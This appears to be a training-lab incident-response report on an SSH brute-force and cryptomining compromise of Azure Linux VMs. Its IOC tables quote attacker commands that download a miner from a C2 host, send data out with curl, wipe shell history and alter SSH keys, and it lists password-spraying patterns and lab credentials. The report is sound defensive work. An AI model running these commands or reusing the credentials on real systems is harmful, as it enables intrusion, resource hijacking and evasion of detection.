# brute-force-breach-report

Azure Abuse / Crypto-Mining / Brute-Force Incident

 
Executive Summary
Following the Azure Abuse Notification, a full investigation was conducted. Findings confirm this was an internal, student-driven compromise originating from linux-vulnmgmt- kobe. The attack resulted in crypto-mining deployment, lateral movement, and external brute-force activity.

Figure1: Full Incident Timeline
 
5Ws Summary
Who:
•	Primary Attacker: linux-vulnmgmt-kobe — entry confirmed by Defender Incident 2400 (brute force)
•	Lateral Movement / Miner Drop: Levi-Linux-Vulnerability — observed crypto-miner deployment
•	External Brute-Force Stage: sakel-lunix-2 — 244,000+ outbound attempts to platforms like Twitter and YouTube
What:
•	Brute-force login succeeded on kobe
•	.diicot, .balu crypto-miner deployed from Levi-Linux-Vulnerability
•	sakel-lunix-2 engaged in external abuse
When:
•	Initial brute force: Feb 18, 2025 (kobe)
•	Crypto-miner activity: Feb 20, 2025 (levi)
•	External brute force: Mar 14–17, 2025 (sakel-lunix-2)
Where:
•	Internal Cyber Range Linux VMs
Why:
•	Resource hijacking for crypto mining
•	External abuse triggered Microsoft Malicious Activity Notice
•	No internal data theft confirmed
 
Incident Overview


Data Point	Value
Abuse Alert	External brute-force attempts
PublicIP Trigger	20.81.228.191
Timestamp	3/18/2025 - 6:40UTC
Source	Azure VM flagged by Defender / Abuse
Report
Potential Impact	Crypto miner activity, lateral movement,
credential abuse

 

Microsoft Email Investigation Trigger

 
Define Scope + Initial Hypothesis

Hypothesis
The virtual machine using public IP 20.81.228.191 was compromised and is suspected of performing external brute-force attacks.
Scope and First Task
•	Identify the asset assigned IP 20.81.228.191
•	Start mapping activity based on:
o	Microsoft Defender Incident ID 2400
o	Sentinel logs and Microsoft Defender for Endpoint Advance Threat Hunting KQL queries
•	The goal is to confirm the compromise, map attacker actions, and investigate the attacker’s behavior while having an established foothold. 
Data Gathering  Threat Hunting Begins
Validate Microsoft Claim

Microsoft Reported IP – Attributed to:

Field	Value
DeviceName	sakel-lunix-2.p2zfvso
Device ID	876cbf2b7414f889a884d436a2232cfa7471
c233
Public IP	20.81.228.191
OS	Linux
Timestamp of Activity	2025-03-18 06:40:38Z

 
Hunt for Outbound SSH Brute-Force
Check if sakel-lunix-2 with DeviceID 876cbf2b7414f889a884d436a2232cfa7471c233 was performing outbound brute-force SSH attempts as Microsoft reported.

•	Found hits using Device Name
•	During the investigation, 30,000+ SSH brute-force attempts were recorded originating from sakel-lunix-2.
•	Important Indicators of Compromise noticed
•	During the investigation, a low-hanging fruit discovery exposed direct compromise evidence early in the analysis, accelerating the identification of attacker actions.
 
Brute-Force Campaign Findings


Field	Value
DeviceName	sakel-lunix-2
Internal IP	10.0.0.217
Role	Linux VM — Confirmed as origin of brute-
force campaign
•	Total Attempts: 244,560 SSH brute attempts (Port 22)
•	External Targets: Thousands of unique IPs hit in automated fashion
•	Internal Targets: 256 internal IPs scanned



External Brute-Force Behavior:
•	Sequential scan behavior observed
•	Each IP received exactly 3 SSH attempts
•	Suggests automated tool or script.
 
Attack Timeline s Narrative (Prepare-Engage)
Internal Lateral Movement Investigation
Determine if the attacker (sakel-lunix-2) attempted lateral movement by brute-forcing internal lab systems.

 
 
MITRE ATTsCK Mappings:

Tactic	Technique	Status
Credential Access	T1110 – Brute Force Attack	Confirmed
Lateral Movement	T2021 0 Remote Services
(SSH)	In Progress (Internal focus
next)
Internal Attack Summary

Metric	Value
Internal Targets	256 unique 10.x.x.x
Confirmed Behaviour	Sequential Scan detected
Risk:	High – potential attempts to move laterally
inside the environment
 

 
Assessment / Conclusion:
•	Attacker attempted lateral movement by scanning the entire 10.0.0.x subnet
•	No internal system received repeated brute attempts
•	Indicates worm-like scanning, not direct credentialed pivot
•	Lateral move unsuccessful based on scan pattern (low persistence, no focused brute) likely mapping the network at this stage.

MITRE ATTCCK Mappings:
Tactic	Technique	Status
Credential Access	T1110 – Brute Force Attack	Confirmed
Lateral Movement	T2021 0 Remote Services
(SSH)	In Progress (Internal focus
next)
 
Deep Dive: Investigating Sakel-Lunix-2 as the Primary Compromised Host
The next phase of this investigation focuses on sakel-lunix-2. The objective is to review process events, network activity, and file behavior on this system. This analysis aims to identify any signs of suspicious actions or potential compromise linked to the broader incident.
 

The table helps us track the threat actor’s activity across the environment.

Extracted IOCs

Type	Indicator / Artifact	Description
File / Path	/var/tmp/Documents/.diicot	Malware artifact - mining binary
File / Path	/var/tmp/Documents/.kuak	Malware artifact - secondary
payload
File / Path	/var/tmp/dicot/.diicot	Malware deployment directory
File / Path	/var/tmp/kuak/var/tmp/Documents/.
kuak	Payload / artifact replication
File / Path	.balu	Malicious miner binary
downloaded from C2
File / Path	.cache	Likely storing miner or logs
File / Path	/var/tmp/cache	Malware / miner staging folder
 
File / Path	~/.bash_history	Bash history wiped for evasion
IP Address	85.31.47.99	Malicious Command C Control
(C2), miner download
Command	rm -rf /var/tmp/Documents	File deletion (destruction /
evasion)
Command	chattr -iae ~/.ssh/authorized_keys	SSH key file modification for
persistence
Command	pkill Opera, pkill crnjc, pkill java, pkill
xmrig	Process killing (resource hijacking
prevention)
Command	wget -q
85.31.47.99/NzJOTWxvcs/.balu	Miner payload download
Command	curl -O -s -L
85.31.47.99/NzJOTWxvcs/.balu	Miner payload download
Command	chmod +x cache	Setting executable permission on
malware
Command	history -c	Bash history wipe
Command	rm -rf .bash_history	Remove bash history - defense
evasion
Command	crontab -r	Removing cron jobs for
persistence clearing

•	This IOC list shows heavy resource hijacking, defense evasion, and persistence techniques.
•	IP 85.31.47.99 is the confirmed malware C2.
•	Commands show miner deployment and anti-forensic behavior.
 
 
 
 

Initial Hypothesis:
•	levi-linux-vulnerability is the earliest infected VM
•	Likely Patient Zero based on:
	Earliest timeline entry
	Consistent payload execution
•	Spread from levi → Other Linux VMs
•	sakel-lunix-2 became the brute-force launch point after compromise
 
Findings	Evidence
Suspicious downloads (curl, wget, python)	Process events
Connection to miner IPs and .x/black	Network logs
rm -rf destructive commands with network
keyword	Process hunting
Discovery of retea and diicot miner
payloads	Execution logs
Lateral movement and SSH brute-force
spread	Device-to-device infection




 
Full Payload Breakdown
Persistence s Cleanup
•	crontab -r → Crontab removal (disable scheduled defenses)
•	chattr -iae ~/.ssh/authorized_keys → Attempts to modify SSH authorized_keys
•	history -c / rm -rf .bash_history ~/.bash_history → Clear evidence
•	/etc/sysctl.conf modified (file descriptor limits maxed for mass connections)

Command s Control (C2) s Payloads

IOC / Domain / IP	Purpose
dinpasiune.com/payload	Remote payload download
85.31.47.99/.NzJjOTYwxx5/.balu	Payload dropper / miner binary
80.76.51.5/.NzJjOTYwxx5/.balu	Redundant miner source

File System / Execution Artifacts

File / Directory	Purpose
/var/tmp/Documents/.diicot	Likely the miner / malware binary
/var/tmp/kuak	Secondary dropped file / helper script
/tmp/cache	Execution staging
/dev/shm/.x/	Hides binaries

Brute Force User Enumeration s Password Spraying
•	Reads /etc/passwd
•	Attempts multiple common password combinations:
•	${user}123, ${user}1234, ${user}@123, Passw0rd, P@ssw0rd, Huawei@123, etc.
•	Fully automated internal credential harvesting and spraying

Mining Activity
•	xmrig, cnrig, Opera, java processes killed (competing miners removed)
•	Replaces with own miner .diicot, .balu, .kuak
 
Incident Recap – Findings So Far

Category	Details
Primary Brute-Force Origin	sakel-lunix-
2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Internal IP	10.0.0.217
Behavior Observed	-	Automated SSH brute-force campaign targeting internal and external IPs
-	Sequential IP scanning
Total SSH Attempts
(External)	244,560+ attempts observed targeting external IPs over
port 22
Internal Targets	256 unique internal IPs targeted
Attack Pattern	-	Systematic sequential scanning
-	Repeated attempts (3 hits per external IP block)
Brute-Force Conclusion	Confirmed sakel-lunix-2 is responsible for large-scale
brute-force, but NOT initial infection

Pivot – Infection Spread Identified (Lateral Movement / Propagation)

Infected VM	First Observed Infection Timestamp	Notes
levi-linux-vulnerability	Feb 20, 2025 - 18:30 UTC	Earliest miner activity (.diicot / .retea
payloads)
linux-program-fix	Mar 4, 2025 - 17:51 UTC	.retea payload matched
linux-programatic-ajs	Mar 7, 2025 - 21:24 UTC	Consistent with infection
timeline
linux-programmatic-vm-
danny	Mar 11, 2025	Follows pattern
linuxvmdavid	Mar 13, 2025	Similar miner payload
sakel-lunix-2	Mar 14, 2025 - 17:46 UTC	Not initial compromise. Launch point for external
brute-force.
 
 
 
Stage: Persistence





Cleanup C Hiding Mining Activity
Payload Hosts




File System Abuse



Brute Force Logic	Action/IOC
crontab -r, SSH key manipulation (chattr - iae
~/.ssh/authorized_key s)
history -c, bash history deletion
.diicot, .balu, .kuak, xmrig, process kills (pkill xmrig, pkill java)

dinpasiune.com/payloa d, 85.31.47.99/.NzJjOTYw
xx5/.balu, 80.76.51.5/.NzJjOTYwx
x5/.balu
/var/tmp/,
/dev/shm/.x,
/tmp/cache
Userlist generation (/etc/passwd extraction), common password spraying	 
 
Attacker Infrastructure s Brute-Force Activity Timeline
During the logon analysis of linux-vulnmgmt-kobe, multiple suspicious external IPs attempted SSH brute-force logins. Investigation confirms additional malicious IPs actively targeting this VM alongside the primary miner infrastructure.

Figure11: Kobe Threat Actor Node - Lateral Spread Visualization

 
Malicious IPs Identified from DeviceLogonEvents

Timestamp
(UTC)	Remote IP	Location	ISP/ASN	Activity	Status
Feb 25, 2025
10:54	218.92.0.225	China, Jiangsu	Chinanet (ASN 4134)	Brute-Force on root	Malicious - Repeated
attempts
Feb 25, 2025
10:55	172.56.55.120	USA,
California	T-Mobile (ASN 21928)	Brute-Force on k24saing	Malicious - Repeated
attempts
Feb 25, 2025
10:55+	218.92.0.227	China,
Jiangsu	Chinanet
(ASN 4134)	Brute-Force
on root	Malicious -
Persistent
Feb 25, 2025
10:56+	218.92.0.222	China, Jiangsu	Chinanet (ASN 4134)	Brute-Force on root	Malicious - 13/96
Vendors
Flagged

 
Threat Intelligence (VirusTotal / Defender)

IP	Detection	Details
218.92.0.222	13/96 vendors	Malware, Phishing,
Suspicious - Nanjing, China
218.92.0.227	Defender Alerts (6 active)	Repeated login attempts
218.92.0.225	Defender Alerts	Internal failed logins
172.56.55.120	Low reputation	Unusual login attempt,
observed once
•	Kobe received inbound SSH connection from 218.92.0.222 (ChinaNet, flagged malicious).

•	VirusTotal confirms 218.92.0.222 as a high-risk China-based IP, associated with Chinanet (ASN 4134), flagged for malware and phishing operations.
 
 
MITRE Tactics Mapped:

Tactic	Technique	Observations
Initial
Access	T1078 - Valid
Accounts	SSH brute-force using weak lab credentials.
	T1190 - Exploit Public-Facing
Application	Initial compromise via levi-linux-vulnerability exploiting SSH or web services.
Execution	T1059 - Command and Scripting
Interpreter	.diicot, .retea, .balu miner payloads executed.
	T1203 - Exploitation
for Client Execution	curl / wget payload delivery, direct execution from
attacker-controlled infrastructure.
Persistence	T1053.003 -
Scheduled Task /
Cron	Malicious cron jobs observed in linuxvmvulnerability-test-corey and others.
	T1070.004 -
Indicator Removal
on Host	Cleared bash history, manipulated logs to hide traces.
Defense Evasion	T1562.004 - Disable or Modify System
Firewall	iptables -w -t security -C OUTPUT -d 168.63.129.16
-j DROP — Attempted block of Azure Metadata
Service.
	T1070.003 - Clear
Command History	Verified: History wiping commands executed.
	T1140 -
Deobfuscate/Decod	Payloads fetched and executed via curl/wget, likely
base64-encoded.
 
	e Files or
Information	
Credential
Access	T1110 - Brute Force	SSH brute-force confirmed by linux-vulnmgmt-
kobe attempting internal logins.
	T1552.001 -
Unsecured Credentials:
Credentials In Files	Checked audit logs for passwd, shadow, sudo —
indicating credential-hunting behavior.
Discovery	T1083 - File and Directory Discovery	Searched system audit rules, firewall configs, kernel modules — typical recon prior to
exploitation.
	T1016 - System Network Configuration
Discovery	iptables -nL, checked UFW status, listed iptable mangle table — proving network config recon.
Lateral
Movement	T1021.004 - SSH	Kobe pivoted internally, brute-forcing other Linux
VMs and spreading miners.
Command
C Control	T1071.001 - Web
Protocols	Outbound curl/wget to 218.92.0.222 (ChinaNet)
and other miner pools.
Impact	T1496 - Resource
Hijacking	Multiple VMs infected, mining processes deployed,
leading to resource consumption.

Conclusion on Lateral Movement and Internal Infection
Following Kobe’s compromise:
•	Post-compromise, linux-vulnmgmt-kobe launched internal SSH brute-force attacks targeting multiple Linux VMs.
o	Confirmed infected internal targets: levi-linux-vulnerability, linux-program- fix, linux-programatic-ajs, linux-programatic-vm-danny, linuxvmdavid
o	sakel-lunix-2 (performed external abuse)
•	Malware indicators detected:
o	Deployment of .diicot and .retea miner binaries across compromised systems.
•	Attack method:
o	Internal SSH brute-force pivoting.
o	Lateral movement observed as Kobe expanded the miner infection.
•	Impact:
o	Widespread internal compromise of the environment.
 
o	Activity aligns with MITRE T1496 - Resource Hijacking, confirming the use of systems for crypto-mining operations.

Threat Intelligence - OSINT Validation of IOCs

Microsoft TI Report
1.	Malicious Infrastructure - IPs s Domains

IOC/URL	Detection Rate	VT Verdict	Notes
85.31.47.99	2 / 96	Malicious	Hosts .balu miner payload
dinpasiune[.]com	3 / 96	Phishing / Malware	Direct malware delivery domain, resolves to multiple
suspicious IPs
80.76.51.5	16 / 96	Malware /
Phishing	Also hosts .balu miner
payload
 
2.	VirusTotal Passive DNS s ELF Malware Communication

Domain / Subdomain	Related ELF	VT Verdict	Notes
85.31.47.99	2 / 96	Detection	ELF miner binaries used
in the attack
dinpasiune[.]com	3 / 96	Phishing / Malware	Passive DNS -
subdomain linked
80.76.51.5	16 / 96	Malware / Phishing	Passive DNS -
subdomain linked

3.	Malware ELF Payloads Identified
•	Files: .diicot, retea, payload, 263839397, Update
•	Type: ELF Linux Miner / Trojan
•	Detection rate: 25 - 34 / 64 AV engines
•	Behavior: SSH brute-force, credential harvesting, crontab persistence, miner deployment.

4.	Risk Summary (From Community and Vendor Scores)

Source	Community/Vendor Risk
dinpasiune[.]com	-55 score (VT)
85.31.47.99	Flagged as Malicious
80.76.51.5	Flagged as Malware / Phishing
Related ELF Files	High detection - Confirmed malicious

 
 

 
 
 
Conclusion - Confirmed Threat Indicators
•	dinpasiune[.]com is a malware C2 infrastructure.
•	Associated with multiple ELF miner payloads and brute force tools.
•	Threat actors host ELF binaries on these domains and actively spread mining malware.
•	OSINT confirms malicious classification by multiple vendors.

Extract Payloads and Hashes
Payload bash script and the VT screenshots, you already have these file names / payloads:
•	.diicot
•	retea
•	payload
•	cache
•	.balu
•	Update
•	263839397
•	81d9b238a4a7e06e0a5bfeaacc3a3269d.virus


Extract SHA256

 
Malware Detection and Device Involvement Summary
The investigation confirmed multiple malicious ELF binaries tied to the campaign. Based on Defender and VirusTotal analysis, the following samples were identified with their SHA256 hashes, detection rates, and affected devices:
Sample: retea
•	SHA256:
061f2562bf4ad2db25f218e218920aece057024cd2c8826c87f65acc29583191
•	Detection: 25/64 (VirusTotal)
•	Device: Levi-Linux-Vulnerability
•	Notes: Core payload responsible for persistence, miner deployment, and system modifications.
Sample: cache
•	SHA256:
8c2a00409bad8033fec13fc6ffe4aa4732d80400072043b71ceb57db37244129
•	Detection: 6/64 (VirusTotal)
•	Devices:  Linux-Program-Fix,  sakel-lunix-2
•	Notes: Secondary artifact; low detection but present on systems linked to the campaign.
Sample: update
•	SHA256:
7d48d223d81a0dd8150d27685a7f9808cb59bd9da918f992ce6dac1c387aa16e
•	Detection: 5/64 (VirusTotal)
•	Devices: Levi-Linux-Vulnerability, Linux-programatical-vul-remediation-lokesh
•	Notes: ELF binary involved in maintaining persistence and possible miner communication.
Sample: cache (variant)
•	SHA256: 0e13e9e4443102bf5b26396b5319f528642b4f0477feb9c7f536fab379b73074
•	Detection: 34/64 (VirusTotal)
•	Devices: Levi-Linux-Vulnerability, Linux-programatical-vul-remediation-lokesh
 
•	Notes: High detection rate; linked to TOR communication, potential mining operation, and system compromise.


Device Impact Summary
•	Levi-Linux-Vulnerability: Main compromised system executing retea, update, and cache variants.
•	Linux-Program-Fix: Secondary system with cache sample present.
•	sakel-lunix-2: Involved in spreading the cache sample, linked to brute-force and propagation.
•	Linux-programatical-vul-remediation-lokesh: Received update and cache variant samples, showing signs of deeper compromise.


Important Findings
•	All malware samples are Linux ELF binaries.
•	No detection of these payloads on any Windows systems.
•	Evidence of brute-force activity originating from sakel-lunix-2.
•	Payloads designed for persistence, SSH credential brute-forcing, and potential crypto-mining.
•	Indicators of TOR traffic and attempts to evade detection by modifying system files and bash history.
 
 
 
 
 
 
 
 
 
 

Data Exfiltration Findings
During the investigation, multiple instances of outbound curl --silent commands were identified from compromised Linux virtual machines. These commands exfiltrated collected IP addresses and possible reconnaissance data to attacker-controlled infrastructure.
The attacker utilized the following two exfiltration servers:
•	196.251.73.38 (observed on ports 47 and 8000)
 
•	87.120.116.35 (observed on ports 47 and 8000)
•	Each curl command transmitted victim IP addresses and host information to these servers. Most of the activity originated from:
o	sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
o	linux-programatic- ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
o	linux-programatical-vul-remediation- lokesh.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Examples of victim IPs exfiltrated:
•	200.98.137.5
•	195.238.190.24 (high frequency - 20 hits)
•	52.14.120.128
•	13.212.131.224
•	74.208.7.102
•	54.177.195.166
Many others in the same pattern.
•	The attacker didn’t steal any data from our environment.
•	Used compromised Linux VMs as attack tools to send traffic out.
•	His goal was to target external servers, websites, and possibly mining pools.
•	The traffic was outbound — trying to connect to IPs like AWS, IONOS, and a few flagged malicious servers.
•	This means the attacker used our environment to run attacks.
•	Our VMs became part of his attack chain — sending brute-force attempts and miner traffic outside.
•	There’s no sign of internal data being exfiltrated.
•	It was all outbound, targeting others.
•	At this stage, no Windows-based systems showed similar behavior or involvement.


Threat Intelligence (TI) - Exfiltration IPs Analysis
1Sc.251.73.38
•	Detection: 1/96 security vendors flagged it as malicious.
•	Tags: Malicious, Miner (GCP Abuse Intelligence).
•	Community notes: Suspicious behavior confirmed.
 
•	Last analysis: 25 days ago.
•	Reputation: Associated with cryptomining and malicious activity.
87.120.11c.35
•	Detection: 8/94 security vendors flagged it as malicious.
•	Tags: Malware, Miner, Malicious (ArcSight, Fortinet, SOCRadar).
•	Country: 🇧🇬 Bulgaria (GeoIP).
•	Reputation: Known for malware distribution and command-and-control (C2) activity.
•	Last analysis: 13 days ago.

Conclusion
Both exfiltration IPs are confirmed malicious and linked to:
•	Crypto-mining operations
•	C2 infrastructure
•	Malware distribution
These IPs were used for data exfiltration and system reporting based on captured curl
activity.
 
 
 
Additional Findings — Malicious Activities and Payloads


 
 

Persistence / Cleanup / Evasion Commands
•	Mar 21, 2025 — linux-vm-vulnerability-test-tau
•	Malware attempted cleanup, cron removal, and history wipe Payload QQhXSHsC executed after wiping traces

Device: linuxvmvulnerability-test- corey.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
•	Total IOC Hits: 28
•	Severity: Critical
•	First Seen: Mar 20, 2025, 4:27:04 AM
•	Last Seen: Mar 20, 2025, 4:27:10 AM
•	Behavior: Scans critical directories (/bin, /usr/bin, /usr/local/bin) — likely reconnaissance or data harvesting.
 
Device: linux-vm-vulnerability-test- tau.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
•	Total IOC Hits: 10
•	Severity: Critical
•	First Seen: Mar 21, 2025, 7:13:29 AM
•	Last Seen: Mar 21, 2025, 7:13:29 AM
•	Behavior: Persistence removal (crontab -r, chattr)
•	Miner cleanup (pkill xmrig, rm -rf xmrig)
•	Execution of possible new payload (QQhXSHsC)
•	Evidence wiping (history -c, .bash_history)
 
New IOCs Extracted and Checked:
1.	Hash: 3c1f9f07eacc2f057a609c955e2fde38493521268f3493717ffa5a31b261f3ef
•	Malware Family: XORDDoS
•	Device: ff-vm-lx-224-base.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
•	Date: Feb 25, 2025 04:20:37 UTC
•	Path: /usr/bin/ygljglkjgfg0 (via curl)

2.	Hash: 6ddf688bdf16a1d465aef954ff90b372dacd8162bac2c7797ff7b6b4f20afcbc
•	Malware Family: XORDDoS
•	Device: linux-vulnmgmt- kobe.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
•	Date: Feb 26, 2025 00:23:35 UTC
•	Path: /usr/bin/ygljglkjgfg0 (via curl)

3.	Hash: 6ddf688bdf16a1d465aef954ff90b372dacd8162bac2c7797ff7b6b4f20afcbc
•	Malware Family: XORDDoS
•	Device: linux-vm-vulnerablity- test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
•	Date: Feb 26, 2025 04:20:39 UTC
•	Path: /usr/bin/ygljglkjgfg0 (via curl)

4.	Hash: 268132cf61dfb55c5ebb7ef34a58c915442949b92f645c6f28887ceca5c6c19d
•	Malware Family: XORDDoS
•	Device:   lab-linux-vuln.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
•	Date: Feb 27, 2025 22:30:28 UTC
•	Path: /usr/bin/ygljglkjgfg0 (via curl)

5.	Hash: 0e817a2325c215997de15851152a66924874739eeff5da4b434e5d36c83a76eb
•	Malware Family: XORDDoS
•	Device: linux-vm-vun-test- zay.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
 
•	Date: Mar 3, 2025 22:19:08 UTC
•	Path: /usr/bin/ygljglkjgfg0 (via curl)


6.	Hash: 2f70458e2b77fba49697e3fbba8bea53e27e7ca010fd92ca3919b819d3aee160
•	Malware Family: XORDDoS
•	Device: linux-moh-jan.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
•	Date: Mar 6, 2025 22:34:07 UTC
•	Path: /usr/bin/ygljglkjgfg0 (via curl)

7.	Hash: 75bfd448e4274cc4e5804c43768f62a36ccb3fc3b1df06e14d9c892daa2cde19
•	Malware Family: XORDDoS
•	Device: linuxvmvulnerability-test- corey.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
•	Date: Mar 20, 2025 04:27:05 UTC
•	Path: /usr/bin/ygljglkjgfg0 (via curl)


8.	Hash: 2f70458e2b77fba49697e3fbba8bea53e27e7ca010fd92ca3919b819d3aee160
•	Malware Family: XORDDoS
•	Seen in: payload p.txt
•	Spread across: Multiple VMs (downloaded by script)
 
 
 
 
 
 
 
Technical Analysis
During the investigation, linux-vulnmgmt-kobe was confirmed as the attack origin. The student abused lab conditions — weak SSH credentials and poor monitoring — to compromise multiple Linux VMs and deploy crypto-mining malware.

Initial Compromise and Payload Deployment (Patient Zero Identified)
The investigation confirmed that levi-linux-vulnerability acted as Patient Zero for this attack campaign. On February 20, 2025, this VM initiated the compromise by executing mining payloads retrieved from known malicious infrastructure:
•	dinpasiune.com
•	80.76.51.5
Deployed Malware Artifacts:
•	.diicot
•	.bisis
•	.retea
•	.kuak
Threat Actor established persistence using cron jobs and modified critical system files. System logs and bash history were cleared to evade detection and forensic review.
 
Lateral Movement and Internal Spread
Between February 23 and February 26, the attacker performed SSH brute-force attacks from compromised VMs, moving laterally across the environment. Each system showed evidence of miner execution, persistence techniques, and artifact similarities linking back to Patient Zero.
External Abuse and Azure Policy Violation
Parallel to the internal spread, sakel-lunix-2 launched aggressive external brute-force attacks targeting several public platforms:
•	Twitter, YouTube, Additional services
Over 244,000 brute-force attempts were recorded. This behavior violated Azure’s acceptable use policies and triggered a formal Microsoft Malicious Activity Notice for external abuse of cloud resources.
 
Attack Timeline and Lateral Movement Chain



 

Timestamp	Device	Remote IP	Port	Action / Binary
Feb 20, 2025	levi-linux-
vulnerability	87.120.116.35	42	./YAvdMwRw
Feb 20, 2025	levi-linux-
vulnerability	80.76.51.5	80	curl -s
80.76.51.5/.x/black3
Mar 4, 2025	linux-program-
fix	196.251.73.38	42	./MNFleGNm
Mar 4, 2025	linux-program-
fix	196.251.73.38	1337	./MNFleGNm
Mar 7, 2025	linux- programatic-
ajs	196.251.73.38	42	./AqsEUmKy
Mar 7, 2025	linux- programatic-
ajs	196.251.73.38	1337	./AqsEUmKy
Mar 13, 2025	linuxvmdavid	196.251.73.38	42	./oGBeupSS
Mar 13, 2025	linuxvmdavid	196.251.73.38	1337	./oGBeupSS
Mar 13, 2025	linux- programatical- vul- remediation-
lokesh	87.120.116.35	1418	/var/tmp/.update- logs/Update
Mar 13, 2025	nux- programatical- vul- remediation-
lokesh	80.76.51.5	80	curl -s 80.76.51.5/.x/black3
Mar 14, 2025	sakel-lunix-2	196.251.73.38	42	./UpzBUBnv
Mar 14, 2025	sakel-lunix-2	196.251.73.38	1337	./UpzBUBnv
Mar 14, 2025	sakel-lunix-2	196.251.73.38	47	curl --silent save-
data exfil
 
MITRE ATTsCK Mapping
The following diagram visualizes the observed attack progression based on MITRE ATTCCK phases and our detection data. It summarizes the student’s activity from reconnaissance to crypto-mining execution


Tactic	Technique	Observations
Initial
Access	T1078 - Valid Accounts	SSH brute-force using weak lab credentials
(labuser / Cyber23!).
	T1190 - Exploit Public-
Facing App	Initial compromise via levi-linux-vulnerability
(SSH/web service exposure).
Execution	T1059 - Command and
Scripting Interpreter	.diicot, .retea, .balu payloads executed with
bash, curl, wget.
	T1203 - Exploitation for
Client Execution	curl/wget direct payload fetching and
execution.
Persistence	T1053.003 - Scheduled
Task / Cron	Malicious cron jobs on multiple VMs (e.g.,
linuxvmvulnerability-test-corey).
	T1070.004 - Indicator
Removal on Host	.bash_history wiped, logs cleared post-
execution.
Defense
Evasion	T1562.004 - Disable or
Modify System Firewall	iptables rules used to block Azure Metadata
(168.63.129.16).
	T1070.003 - Clear
Command History	History wiping confirmed.
 
	T1140 -
Deobfuscate/Decode
Files or Info	Encoded payloads executed via curl/wget.
Credential
Access	T1110 - Brute Force	SSH brute-force from kobe toward internal
Linux VMs.
	T1552.001 - Unsecured
Credentials in Files	auditctl used to probe passwd, shadow, sudo
logs.
Discovery	T1083 - File and
Directory Discovery	System audit rule checks, file recon, temp
directories.
	T1016 - System Network Configuration
Discovery	UFW/iptables, mangle table, kernel module checks.
Lateral
Movement	T1021.004 - SSH	Confirmed pivoting by kobe, spreading miners
internally.
Command C Control	T1071.001 - Web
Protocols
(HTTP/HTTPS)	Outbound curl/wget to 218.92.0.222, miner pools.
Exfiltration	T1041 - Exfiltration Over C2 Channel	curl POST /save-data?IP= observed —
indicative of possible victim IP/data
exfiltration.
Impact	T1496 - Resource Hijacking	.diicot and .balu miner deployment, sustained CPU-intensive mining on multiple
compromised VMs.
 
Vulnerability Notes (CVEs s VM Practices)
CVE Content
•	No specific CVEs exploited — access was gained through brute-forcing weak SSH credentials.
•	Miner payloads like .diicot and .balu were dropped after gaining access, typical of post-compromise activity.
•	This was a real attack inside the lab, carried out by a rogue student.
•	Defender VA agent was running — no critical CVEs flagged during the investigation.
•	Key takeaway: Attack succeeded due to weak credentials, not missing patches. Shows how valid account abuse and poor hardening open the door — even without a CVE.
CVE-2018-10933 — libssh Authentication Bypass Vulnerability Example
•	Description: A flaw in libssh allowed an attacker to bypass authentication by presenting "SSH2_MSG_USERAUTH_SUCCESS" instead of the expected "SSH2_MSG_USERAUTH_REQUEST".
•	Impact: Remote attackers could gain unauthenticated access to servers using vulnerable versions of libssh.
•	Relevance: Common in poorly maintained Linux environments; this aligns with weak SSH access and brute-force attack scenarios like your case.
Reference:  https://nvd.nist.gov/vuln/detail/CVE-2018-10933

Risk and Impact Summary

Risk	Impact	Likelihood	Notes
Crypto-Mining	High	High	Resource abuse, Azure
abuse report received
External Brute-
Force	High	High	244K SSH attempts
toward internet targets
Internal Exfiltration	low	low	No data theft from
environment confirmed
Persistence	Medium	Medium	Cron jobs, history
wiping observed
 
Containment s Eradication
Actions Taken by our Mentor s Lead Instructor: Josh Madakor
•	Full deletion of compromised student VMs within the affected resource group
•	Confirmed Sentinel and Defender core monitoring remained unaffected
•	Azure Abuse case acknowledged and closed following remediation
•	Reviewed outbound NSG rules to tighten egress controls as shown below
 
Recovery s Prevention
Cyber Range SOC next steps:
•	Defender tuning
•	KQL detection added
•	Security awareness reminder
•	Add permanent detection for mining/SSH brute-force
•	Threat hunting workshop planned
•	Increase logging retention

MITRE DEFEND
•	D3-EDR: Defender for Endpoint deployed
•	D3-MFA: Confirmed enforced on main tenant
•	D3-DATA: Monitored curl exfil attempts
D3-VULN: Defender vulnerability management active


Lessons Learned
•	Cloud-based labs must be hardened like production
•	Weak or shared credentials enable lateral movement
•	Mining campaigns quickly escalate to external abuse
•	Early detection and log monitoring are critical for containment

Status:
•	Incident contained
•	Environment secured
•	Abuse case closed
 
Conclusion:
•	This investigation confirmed a student-initiated internal compromise that simulated real-world attacker behavior. The operation involved SSH brute-force attacks, Linux miner deployment, and communication with known malicious infrastructure.
•	There was no evidence of production impact or internal data exfiltration. All infected resources were isolated and purged.
•	The team successfully followed the IR lifecycle (Detection, Containment, Eradication, Recovery) while aligning with MITRE ATTCCK and DEFEND standards.
•	This case reinforces the importance of strong credential hygiene, continuous monitoring, and proactive threat hunting — even in test environments.
•	Report will be shared with the team to strengthen future detection, prevention.
Recommendations
•	Use created KQL detection rule to monitor for:
o	xmrig, .diicot, .balu, .bisis
o	Outbound traffic to 196.251.x.x / 87.120.x.x / dinpasiune.com
•	Update lab onboarding policies:
o	Enforce unique credentials per VM
o	Prohibit reuse of labuser / Cyberlab123!
•	Enhance NSG egress filtering — block miner pools and known C2s
•	Run periodic MITRE-aligned threat hunts focusing on:
o	T1078 Valid Accounts
o	T1496 Resource Hijacking
o	T1110 Brute Force
 
References:
•	CVE-2018-10933 — libssh Authentication Bypass Vulnerability https://nvd.nist.gov/vuln/detail/CVE-2018-10933

MITRE ATTCCK Framework https://attack.mitre.org/

•	MITRE ATTCCK References for Report:
•	Brute Force (T1110) https://attack.mitre.org/techniques/T1110/
